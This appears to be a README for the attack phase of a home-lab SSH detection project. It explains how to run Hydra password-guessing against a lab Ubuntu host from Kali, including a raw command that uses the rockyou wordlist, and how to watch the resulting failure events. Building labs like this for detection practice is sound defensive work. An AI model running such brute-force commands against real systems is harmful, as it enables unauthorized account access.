# Phase 02 — Attack Simulation

Generates SSH brute-force traffic from Kali against the Ubuntu target so the rest of the pipeline has real data to detect and respond to. The attack is intentionally non-destructive — three passwords, four parallel tasks, none of which are valid — so it produces observable failure events without creating noise on the network.

## What's in this phase

| File | Purpose |
|---|---|
| [`run-attack.sh`](run-attack.sh) | Hydra runner — reads `TARGET_IP` and `LAB_USER` from `lab.env`, sanity-pings the target, then runs the attack |

## Setup on Kali

```bash
# Copy the same lab.env from the target so attacker and target share IPs/user.
sudo install -d /etc/ssh-detection-response
sudo install -m 0644 lab.env.example /etc/ssh-detection-response/lab.env
sudo $EDITOR /etc/ssh-detection-response/lab.env

# Make the runner executable.
chmod +x 02-attack-simulation/run-attack.sh
```

## Running the attack

```bash
./02-attack-simulation/run-attack.sh                 # default values
./02-attack-simulation/run-attack.sh --user alice    # try a different username
./02-attack-simulation/run-attack.sh --dry-run       # print the command, do not run
```

The script:

1. Sources `/etc/ssh-detection-response/lab.env`.
2. Pings the target — fails fast if the internal network is broken.
3. Generates `pw.txt` (3-password list) on first run.
4. Runs `hydra -l <user> -P pw.txt -t 4 -V ssh://<target>`.

Three failed attempts → three `Failed password` events in the journal → enough to trip the Phase 04 detector at default settings (threshold 5 within 60s) once the attack runs back-to-back a second time, or after raising `-t` parallelism. To guarantee a single-run trip, edit the wordlist or pass a custom one via Hydra's `-P`.

## Manual equivalent

If a reviewer prefers to see the raw command without the wrapper:

```bash
hydra -l bader -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://10.10.10.20
```

Same effect, no env handling, no preflight ping.

## Observing on the target

```bash
sudo journalctl -u ssh -f       # live failure stream
ss -tn state established        # confirm Hydra connections (during attack only)
```

You will see one journald entry per failed attempt, each with a `Failed password for bader from 10.10.10.30` message — the exact pattern the Phase 04 detector matches.

## Next

Phase 03 introduces defensive controls (UFW, Fail2Ban) so the same attack now meets resistance, while Phase 04 builds the detection layer that watches it happen.
